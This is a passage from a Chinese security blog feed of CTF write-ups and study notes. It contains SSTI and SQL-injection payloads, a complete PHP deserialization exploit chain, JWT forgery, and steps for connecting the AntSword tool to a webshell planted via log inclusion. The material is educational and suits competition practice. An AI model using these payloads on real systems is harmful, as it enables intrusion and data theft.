class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>第二段是要对文件名进行解密后，cheeseOne变成cheeseTwo然后再变成base64加密后的</p><p><code>Y2hlZXNlVHdv</code></p><p>访问权限限制，只有管理员才能看到</p><p><img src="/%5Cimages%5CISCC3.png"></p><p>jwt伪造，伪造成管理员身份，密钥在源码里</p><p><code>Jerry_Loves_Cheese</code></p><p><img src="/%5Cimages%5CISCC4.png"></p><p><img src="/%5Cimages%5CISCC5.png"></p><p>✅ <strong>管理员认证成功！</strong><br> 奶酪最终位置： <strong>&#x2F;c3933845e2b7d466a9776a84288b8d86.php</strong></p><p>访问得到一串字符串</p><p><img src="/%5Cimages%5CISCC6.png"></p><p><code>I&amp;x%Its~7xy&#39;Ib~sIaV&#39;&#39;ek</code>根据原来的提示最后测试为是与0x16异或得到</p><p>交给ai解答</p><p><img src="/%5Cimages%5CISCC7.png"></p><p><code>_0n3_beh!no1_the_w@11s&#125;</code></p><p>得到最终的flag</p><p><code>ISCC&#123;ch33se_th!ef_!5_the_0n3_beh!no1_the_w@11s&#125;</code></p><h1 id="区域赛部分"><a href="#区域赛部分" class="headerlink" title="区域赛部分"></a>区域赛部分</h1><h2 id="十八铜人"><a href="#十八铜人" class="headerlink" title="十八铜人"></a>十八铜人</h2><p><img src="/%5Cimages%5CISCC8.png"></p><p>明显是get传参，第一个session：</p><p><img src="/%5Cimages%5CISCC9.png"></p><p>访问路由得：</p><p><img src="/%5Cimages%5CISCC10.png"></p><p><em>显示：你过关！kGf5tN1yO8M这样就能拿到flag了吗？住持提出了新的要求：去闯下一关吧！闯过下一关就能拿到flag</em></p><p><code>/nauygnoiqnebna</code>是第二关，构造即可。</p><p><code>Yongzheng=&#123;&#123;lipsum l attr(request.args.a1) l attr(request.args.a2)(request.args.a3) l attr(request.args.a4)((request.args.a5)) l attr(request.args.a6)()&#125;&#125;</code></p><p>BP响应得到flag。</p><h2 id="想犯大吴疆土吗"><a href="#想犯大吴疆土吗" class="headerlink" title="想犯大吴疆土吗"></a>想犯大吴疆土吗</h2><p>源码发现注释，审计输入url?box1&#x3D;古锭刀&amp;box2&#x3D;杀&amp;box3&#x3D;酒&amp;box4&#x3D;铁索连环得到原码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /?box1=%E5%<span class="hljs-number">8</span>F%A4%E9%<span class="hljs-number">94</span>%AD%E5%<span class="hljs-number">88</span>%<span class="hljs-number">80</span>&amp;box2=%E6%<span class="hljs-number">9</span>D%<span class="hljs-number">80</span>&amp;box3=%E9%<span class="hljs-number">85</span>%<span class="hljs-number">92</span>&amp;box4=%E9%<span class="hljs-number">93</span>%<span class="hljs-number">81</span>%E7%B4%A2%E8%BF%<span class="hljs-number">9</span>E%E7%<span class="hljs-number">8</span>E%AF HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">112.126.73.173:49101</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">136.0.0.0</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Cookie</span>: PHPSESSID=<span class="hljs-number">515</span>a4a744cb2d53dd77dd970febd696a<br><span class="hljs-attribute">Connection</span>: close<br><br><br><br><br></code></pre></td></tr></table></figure><p>得到的reward.php：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xusheng&#x27;</span>])) &#123;</span><br><span class="language-php">    <span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Reward<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-family:sans-serif;text-align:center;margin-top:15%;&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>想直接拿奖励？<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>尔要试试我宝刀是否锋利吗？<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml">    </span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php">    <span class="hljs-keyword">exit</span>;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-comment">// 犯flag.php疆土者，盛必击而破之！</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GuDingDao</span> </span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$desheng</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;desheng = <span class="hljs-keyword">array</span>();</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$yishi</span></span>) </span>&#123;</span><br><span class="language-php">        <span class="hljs-variable">$dingjv</span> = <span class="hljs-variable language_">$this</span>-&gt;desheng;</span><br><span class="language-php">        <span class="hljs-variable">$dingjv</span>();</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;下次沙场相见, 徐某定不留情&quot;</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TieSuoLianHuan</span> </span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$yicheng</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$pojun</span></span>) </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$pojun</span>);</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;yicheng);</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jie_Xusheng</span> </span>&#123;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sha</span>;</span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-variable">$jiu</span>;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$secret</span> = <span class="hljs-string">&#x27;reward.php&#x27;</span></span>) </span>&#123;</span><br><span class="language-php">        <span class="hljs-variable language_">$this</span>-&gt;sha = <span class="hljs-variable">$secret</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;jiu-&gt;sha;</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;sha)) &#123;</span><br><span class="language-php">            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你休想偷看吴国机密&quot;</span>;</span><br><span class="language-php">            <span class="hljs-variable language_">$this</span>-&gt;sha = <span class="hljs-string">&quot;reward.php&quot;</span>;</span><br><span class="language-php">        &#125;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;你什么都没看到？那说明……有东西你没看到&lt;br&gt;&#x27;</span>;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xusheng&#x27;</span>])) &#123;</span><br><span class="language-php">    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xusheng&#x27;</span>]);</span><br><span class="language-php">&#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-php">    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Jie_Xusheng</span>;</span><br><span class="language-php">    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);</span><br><span class="language-php">&#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-comment">// 铸下这铁链，江东天险牢不可破！</span></span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure><p>审计代码，写反序化链(这个链子的话触发是通过正则去触发<code>__toString()</code>的，然后正常打就行)</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs xquery">*&lt;?php*<br>*class GuDingDa<span class="hljs-number">0</span> &#123;* <br>  *public <span class="hljs-variable">$desheng</span>;* <br>  *public <span class="hljs-keyword">function</span> __get(<span class="hljs-variable">$yishi</span>) &#123;* <br>​    *<span class="hljs-variable">$dingjv</span> = <span class="hljs-variable">$this-</span>&gt;desheng;* <br>​    *<span class="hljs-variable">$dingjv</span>();* <br>​    *<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;下次沙场相见, 徐某定不留情&quot;</span>;* <br>  *&#125;* <br>*&#125;* <br>*class TieSuoLianHuan &#123;* <br>  *public <span class="hljs-variable">$yicheng</span>;*<br>  *public <span class="hljs-keyword">function</span> append(<span class="hljs-variable">$pojun</span>) &#123;* <br>​    *include(<span class="hljs-variable">$pojun</span>);* <br>  *&#125;* <br>  *public <span class="hljs-keyword">function</span> __invoke() &#123;* <br>​    *<span class="hljs-variable">$this-</span>&gt;append(<span class="hljs-variable">$this-</span>&gt;yicheng);*<br>  *&#125;* <br>*&#125;* <br>*class Jie_Xusheng &#123;* <br>  *public <span class="hljs-variable">$sha</span>;* <br>  *public <span class="hljs-variable">$jiu</span>;* <br>  *public <span class="hljs-keyword">function</span> __toString() &#123;* <br>​    *<span class="hljs-keyword">return</span> <span class="hljs-variable">$this-</span>&gt;jiu-&gt;sha;* <br>  *&#125;* <br>  *public <span class="hljs-keyword">function</span> __wakeup() &#123;* <br>​    *<span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this-</span>&gt;sha)) &#123;* <br>​      *echo <span class="hljs-string">&quot;你休想偷看吴国机密&quot;</span>;* <br>​      *<span class="hljs-variable">$this-</span>&gt;sha = <span class="hljs-string">&quot;reward.php&quot;</span>;* <br>​    *&#125;* <br>  *&#125;* <br>*&#125;* <br>*<span class="hljs-variable">$a</span>=new Jie_Xusheng();* <br>*<span class="hljs-variable">$a-</span>&gt;sha=<span class="hljs-string">&#x27;dict&#x27;</span>;*<br>*<span class="hljs-variable">$b</span>=new GuDingDa<span class="hljs-number">0</span>();* <br>*<span class="hljs-variable">$a-</span>&gt;sha=new Jie_Xusheng();* <br>*<span class="hljs-variable">$a-</span>&gt;sha-&gt;jiu=<span class="hljs-variable">$b</span>;*<br>*<span class="hljs-variable">$a-</span>&gt;sha-&gt;jiu-&gt;desheng=new TieSuoLianHuan();* <br>*<span class="hljs-variable">$a-</span>&gt;sha-&gt;jiu-&gt;desheng-&gt;yicheng=<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;*<br>*echo urlencode(serialize(<span class="hljs-variable">$a</span>));* <br>*O<span class="hljs-meta">%3A11</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22Jie_Xusheng</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3A2</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%7Bs</span><span class="hljs-meta">%3A3</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22sha</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3BO</span><span class="hljs-meta">%3A11</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22Jie_Xusheng</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3A2</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%7Bs</span><span class="hljs-meta">%3A3</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22sha</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3BN</span><span class="hljs-meta">%3Bs</span><span class="hljs-meta">%3A3</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22jiu</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3BO</span><span class="hljs-meta">%3A9</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22GuDingDa0</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3A1</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%7Bs</span><span class="hljs-meta">%3A7</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22desheng</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3BO</span><span class="hljs-meta">%3A14</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22TieSuoLianHuan</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3A1</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%7Bs</span><span class="hljs-meta">%3A7</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22yicheng</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3Bs</span><span class="hljs-meta">%3A52</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22php</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%2F</span><span class="hljs-meta">%2Ffilter</span><span class="hljs-meta">%2Fconvert</span>.base64-encode<span class="hljs-meta">%2Fresource</span><span class="hljs-meta">%3Dflag</span>.php<span class="hljs-meta">%22</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%7D</span><span class="hljs-meta">%7D</span><span class="hljs-meta">%7Ds</span><span class="hljs-meta">%3A3</span><span class="hljs-meta">%3A</span><span class="hljs-meta">%22jiu</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3BN</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%7D</span>*<br></code></pre></td></tr></table></figure><p><img src="/%5Cimages%5CISCC11.png"></p><h2 id="回归基本功"><a href="#回归基本功" class="headerlink" title="回归基本功"></a>回归基本功</h2><p>根据提示代理推测改代理为GaoJiGongChengShiFoYeGe</p><p><img src="/%5Cimages%5CISCC12.png"></p><p>打开文件查看</p><p><img src="/%5Cimages%5CISCC13.png"></p><p>审计代码，给a传任意数字，b传任意字符字符，字符弱比较都为0，设置c为一个值，使得c&#x3D;a后，<code>$huiguiflag[1]==md5($c）</code>查资料知Php7.5版本下面有非法字符传参那个漏洞把_改为[</p><p><img src="/%5Cimages%5CISCC14.png"></p><p>Url为</p><p><code>huigui[jibengong.1=1&amp;huigui[jibengong.2=jibengong&amp;huigui[jibengong.3=jibengong+%261=e559dcee72d03a13110efe9b6355b30d</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>数据库</title>
    <link href="/2025/05/20/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <url>/2025/05/20/%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sql注入</title>
    <link href="/2025/05/15/%E6%B5%8B%E8%AF%95%EF%BC%88%E5%9B%BE%E7%89%87%EF%BC%89/"/>
    <url>/2025/05/15/%E6%B5%8B%E8%AF%95%EF%BC%88%E5%9B%BE%E7%89%87%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="无过滤注入"><a href="#无过滤注入" class="headerlink" title="无过滤注入"></a>无过滤注入</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p><img src="/images/web171.jpg"></p><ol><li><strong>闭合单引号</strong>：通过输入<code>&#39;</code>闭合id参数的单引号。</li><li><strong>注入UNION查询</strong>：使用<code>UNION SELECT</code>获取其他数据，确保列数与原查询一致。</li><li><strong>绕过原查询条件</strong>：直接查询username为’flag’的记录，因为UNION后的SELECT不受原查询的<code>username != &#39;flag&#39;</code>限制。</li><li><strong>注释剩余部分</strong>：使用<code>--</code>注释掉原SQL的剩余部分，避免语法错误。</li></ol><p>观察到有三列，两种解发均可，后者会带出id&#x3D;1的那一行，没啥作用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; union select username,password,1 from ctfshow_user where username=&#x27;</span>flag<span class="hljs-string">&#x27; -- </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> username,password,<span class="hljs-number">1</span> <span class="hljs-keyword">from</span> ctfshow_user <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p> <strong>注释符的区别</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>中国蚁剑</title>
    <link href="/2025/03/03/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/"/>
    <url>/2025/03/03/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/</url>
    
    <content type="html"><![CDATA[<p>使用流程：</p><ol><li><strong>添加数据</strong>：打开蚁剑 → 点击 “添加数据”</li><li>配置连接<ul><li><strong>URL</strong>：填入包含日志的 URL（如<code>http://靶场IP/vulnerable.php?file=/var/log/nginx/access.log</code>）</li><li><strong>密码</strong>：填入<code>cmd</code>（对应木马中的<code>$_POST[&#39;cmd&#39;]</code>）</li><li><strong>编码器</strong>：选择<code>UTF-8</code></li></ul></li><li><strong>测试连接</strong>：点击 “测试连接”，成功后即可管理服务器文件、执行命令。</li></ol><p><img src="/images/%E8%9A%81%E5%89%911.png"></p><p><img src="/images/%E8%9A%81%E5%89%912.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>部分总结</title>
    <link href="/2025/01/01/%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/"/>
    <url>/2025/01/01/%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<ol><li><p><em>渗透测试</em><br>  <em>精通OWASP Top 10漏洞原理及利用技术，熟练运用MITRE ATT&amp;CK框架进行威胁建模，具备企业级网络安全架构渗透测试经验（涵盖Web应用、API、内网横向移动、移动应用等场景）。</em><br><em>掌握渗透测试全流程（信息搜集、漏洞探测、漏洞利用、权限维持、痕迹清除），擅长制定针对性测试方案，曾主导多个小型企业网络安全评估项目，累计发现高危漏洞超15个。</em></p></li><li><p><em>Web安全工具：精通Burp Suite全模块操作（Intruder爆破、Repeater、Decoder），擅长自定义插件开发；熟练使用SQLmap、Dirsearch、Nmap、中国蚁剑等工具进行自动化漏洞检测，结合手工测试提升漏洞发现率。</em><br>  3.<em>编程语言：熟练运用Python&#x2F;C&#x2F;Java&#x2F;PHP开发安全脚本与工具（如漏洞扫描器、流量分析脚本），Python获蓝桥杯线下省二等奖，精通动态规划、树状数组、回溯、贪心、滑动窗口递归双指针等，精通将数据结构与算法优化应用于漏洞特征匹配（如二分查找+SQL布尔盲注、堆叠注入、时间盲注绕过waf）。</em></p></li><li><p><em>漏洞研究与代码审计</em><br>  <em>深入研究且精通SQL注入、文件包含、命令执行、反序列化等漏洞原理，具备PHP&#x2F;Java代码审计能力，熟悉网络协议分析（TCP&#x2F;IP、HTTP&#x2F;HTTPS），熟练使用并分析mysql数据库，擅长使用Fiddler、Wireshark、科来网络分析系统进行流量抓包与安全事件溯源。</em></p></li></ol><p><em>项目一：中铁港航东南海洋工程有限公司全栈渗透测试项目 | 2025.02-2025.04</em><br><em>项目背景：在该企业实习期间，为集团旗下Web网址及内部网络进行全方位安全评估，防范数据泄露风险。</em><br><em>采用“黑盒+白盒”测试模式，使用Nmap扫描内网资产，结合BP爆破敏感接口，通过sql布尔盲注发现3处未授权访问漏洞，导致核心用户数据可被遍历。</em><br>*-通过PHP代码审计定位文件上传漏洞，利用蚁剑实现服务器权限获取getshell，进一步横向移动发现域控服务器弱口令，最终完成渗透测试</p><p><em>项目成果：累计发现中危漏洞15个，协助企业建立漏洞管理体系，获该企业奖金5k</em></p><p>http明文传输，https用ssl加密传输,ssl防窃听防中间人</p><p>MITRE ATT&amp;CK是一个知识库，用来规划攻击的</p><p>–tamper&#x3D;space2comment.py</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> payload:<br>    retVal = base64<span class="hljs-selector-class">.b64encode</span>(payload<span class="hljs-selector-attr">[::-1]</span><span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    retVal = base64<span class="hljs-selector-class">.b64encode</span>(retVal<span class="hljs-selector-attr">[::-1]</span>)<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++++++++++++&quot;</span>+retVal)<br></code></pre></td></tr></table></figure><p>堆叠注入用；布尔盲注根据抓包回显判断，benchmark时间盲注</p><p><strong>XSS、越权访问（水平&#x2F;垂直）命令执行、反序列化、文件上传&#x2F;包含&#x2F;路径遍历</strong></p><p>跨站脚本攻击，将<code>&lt;script&gt;</code> 标签代码执行，反射型不会存储在服务器如钓鱼邮件，存储型长期在服务器上，窃取 Cookie，利用受害者身份进行攻击，如拒绝式服务攻击。</p><p>system()    &#x2F;&#x2F; 执行外部程序并显示输出。过滤后可以用passthru。eval($c); 使用 eval() 函数执行 $c 变量中的代码。eval() 会将 $c 中的字符串作为 PHP 代码执行，这可能导致执行任意 PHP 代码，从而形成安全漏洞。调用shell.php，传入cmd，system ls，system cat tac</p><p>本地文件包含漏洞（LFI   伪协议input； data：相对路径被过滤，服务器禁止访问根目录；<strong>include</strong>：当包含 .php 文件时会执行其中的代码，非显示源码z</p><p>大小写绕过，过滤php可以用session，文件可控</p><p>webshell：通过抓包改ua头上传恶意php，在用get或者post传参执行命令</p><p>防御：不要直接包含用户输入，open_base限制PHP可访问的目录</p><p>写脚本监控日志防止数据库泄露</p><p>array检查是否是数组</p><p><strong>编程语言</strong></p><p>sql注入加上python二分查找大大减少爆破时间</p><p><strong>mysql数据库</strong></p><p>联合查询union 